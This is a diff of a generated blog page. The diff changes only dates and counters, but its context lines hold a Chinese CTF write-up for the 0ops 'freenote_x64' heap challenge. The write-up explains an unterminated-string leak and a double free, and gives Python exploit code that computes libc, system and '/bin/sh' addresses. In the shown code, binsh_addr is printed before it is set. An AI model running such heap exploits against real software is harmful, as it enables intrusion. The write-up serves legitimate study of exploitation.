@@ -28,7 +28,7 @@
 <meta property="og:description" content="漏洞程序freenote_x64下载运行程序，这是一个note笔记本程序： 123456789➜  .&#x2F;freenote_x64&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;1. List Note2. New Note3. Edit Note4. Delete Note5. Exit&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&amp;#x3D">
 <meta property="og:locale">
 <meta property="article:published_time" content="2016-05-26T07:42:13.000Z">
-<meta property="article:modified_time" content="2020-11-12T02:26:14.749Z">
+<meta property="article:modified_time" content="2022-08-09T16:06:21.644Z">
 <meta property="article:author" content="Bruce Fan">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
@@ -192,7 +192,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+                <time title="更新于：2022-08-10 00:06:21" itemprop="dateModified" datetime="2022-08-10T00:06:21+08:00">2022-08-10</time>
               </span>
 
           
@@ -208,6 +208,7 @@
       
         <p>漏洞程序<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1nuGARAp">freenote_x64</a>下载<br>运行程序，这是一个note笔记本程序：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  .&#x2F;freenote_x64</span><br><span class="line">&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;</span><br><span class="line">1. List Note</span><br><span class="line">2. New Note</span><br><span class="line">3. Edit Note</span><br><span class="line">4. Delete Note</span><br><span class="line">5. Exit</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <p>new_note和delete_note通过<code>malloc()</code>和<code>free()</code>来管理内存。<br>这个程序有两个漏洞，一个是建立新note的时候在note的结尾处没有加<code>\0</code>因此会造成堆或者栈的地址泄露，另一个问题就是在delete note的时候，并不会检测这个note是不是已经被删除过了，因此可以删除一个note两遍，造成double free。</p>
 <h3 id="泄露libc在内存中的地址"><a href="#泄露libc在内存中的地址" class="headerlink" title="泄露libc在内存中的地址"></a>泄露libc在内存中的地址</h3><p>因为note的结尾没有<code>\0</code>，因此在输出时会把后面的内容打印出来。因为freelist的头部保存在了libc的.bss段，因此我们可以通过新建两个note(必须两个，若只有一个，删除后没有fd，bk)再删除一个note，然后再建立一个新note的方法来泄露出libc在内存中的地址：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">notelen = <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;A&quot;</span> * notelen)</span><br><span class="line">new_note(<span class="string">&quot;B&quot;</span> * notelen)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;\xb8&quot;</span>)</span><br><span class="line"><span class="comment"># 泄露libc的.bss段地址</span></span><br><span class="line">list_note()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0. &quot;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> leak[<span class="number">0</span>:<span class="number">-1</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">leaklibcaddr = u64(leak[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leaklibcaddr)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># freelist保存在libc的.bss段，0x3be7b8是freelist地址与libc起始地址之间的固定偏移（同一程序在不同机器上一样，不同程序不同，可由本地调试得知）</span></span><br><span class="line">libc_base_addr = leaklibcaddr - <span class="number">0x3be7b8</span></span><br><span class="line"><span class="comment"># 0x46640是system在libc.so中的偏移</span></span><br><span class="line">system_sh_addr = libc_base_addr + <span class="number">0x46640</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_sh_addr: &quot;</span> + <span class="built_in">hex</span>(system_sh_addr)</span><br><span class="line"><span class="comment"># 0x17ccdb是&quot;/bin/sh&quot;在libc.so中的偏移</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr: &quot;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">binsh_addr = libc_base_addr + <span class="number">0x17ccdb</span></span><br></pre></td></tr></table></figure>
@@ -343,14 +344,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-count">127</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -377,7 +378,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
